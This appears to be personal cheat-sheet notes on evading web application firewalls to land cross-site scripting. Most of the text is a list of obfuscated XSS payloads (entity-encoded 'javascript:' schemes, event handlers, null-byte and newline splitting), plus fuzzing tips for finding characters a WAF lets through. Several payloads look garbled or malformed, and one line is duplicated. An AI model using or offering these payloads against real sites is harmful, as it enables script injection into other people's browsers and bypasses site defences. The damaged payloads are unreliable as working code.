# bypass WAF

```
https://blog.isec.pl/waf-evasion-techniques
https://labs.cognisys.group/posts/An-Intresting-XSS-Bypassing-WAF
```

# [WAF blocks in HTML tags](WAF blocks in HTML tags) (before JS execution)

# [WAF blocks while JS execution](WAF blocks while JS execution)

- known WAF: search for it on twitter.
- unknown WAF
  - CDN or application based: build your own payload
  - JS protection

- extend your payload gradually

  <x> -> <x onxxx -> <x onxxx= -> <x onerror=

  - no noisy string
  - infer what is being manipulated by WAF

# example payloads

04:06 for explanations

- `<d3v/onmouseleave=[origin].some(confirm)>click`
- `<input type="&#&#x3e"/onfocus="alert(origin)"/autofocus>`
- `<img src=\u003e onerror=alert(origin)>`
- `<details/open=/Open/href=/data=; ontoggle=" (alert)(document.domain)"`
- `<a href=&#01javascript:alert(origin)>`

```
<body onload="console.log('&#39;);&#x61;lert(origin);')">
<img/src/onerror="console.log(&quot;);&#x61;lert(origin);//">
<img/src/onerror="&#U006C;lert(origin);">
<iframe srcdoc="&lt;svg/onload=alert(origin)&gt;"></iframe>
<a href="&#&74;avascript&colon;alert(origin)">test</a>
<a href="&#&74;avascript&colon;alert(origin)">test</a>
<a/href=javascript&colon;alert()>click
<a href="j\u006Cavascript:\u006Cert(origin);">test</a>
<img sr%00c=x o%00nerror=((pro%00mpt(1)))
</*/script>ssss<%00x%20stc=<script>alert(origin);//+++<*/<script>+/*x*/
```

not all payloads work everywhere, for example this only works on akamai because it replaces
after rule set.

# attention

- you will need lots of fuzzing to figure out certain characters:
  - if by `<ifram>` you get 403 but `<%0aifram>` --> 200 --> then on the server it's turned
    into `<iframe>`
  - something like `<%0aimg>` doesn't work on the browser, but when it goes to the server and
    back, the `%0a` will be dropped.
  [fuzz JavaScript scheme](fuzz JS schemes)
  [fuzz html tags](fuzz html tags)

